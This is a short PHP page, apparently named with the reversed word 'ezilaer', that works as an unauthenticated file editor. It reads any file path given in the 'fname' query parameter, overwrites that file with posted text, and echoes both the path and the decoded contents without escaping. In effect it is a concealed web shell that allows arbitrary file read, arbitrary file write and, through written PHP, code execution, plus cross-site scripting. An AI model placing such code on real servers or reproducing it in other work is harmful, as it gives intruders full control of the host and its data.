<!DOCTYPE html>
<html lang="en">
<head>
<title></title>
</head>
<body style='background-color: #000000; padding: 0px; margin: 0px;'>

<?php

if ($_GET["fname"] && $_GET["fname"] != "") {
	$fname=$_GET["fname"];

        if ($_POST["txt"]) {
                $txt=$_POST["txt"];
                $file = fopen($fname, "w") or die("Unable to open file for writing!");
                fwrite($file, $txt);
                fclose($file);
        }

	$file = fopen($fname, "r") or die("Unable to open file for reading!");
    echo "<form method='post' action='ezilaer.php?fname=" . $fname . "'>
		<textarea cols=150 rows=50 id='txt' name='txt' style='padding: 0px; margin: 0px; height: 100%; width: 99%;'>" .
        htmlspecialchars_decode(fread($file,filesize($fname))) .
        "</textarea><input type=submit style='position: relative; left: 25px; top: -25px;'></form>";
	fclose($file);
}

?>

</body>
</html>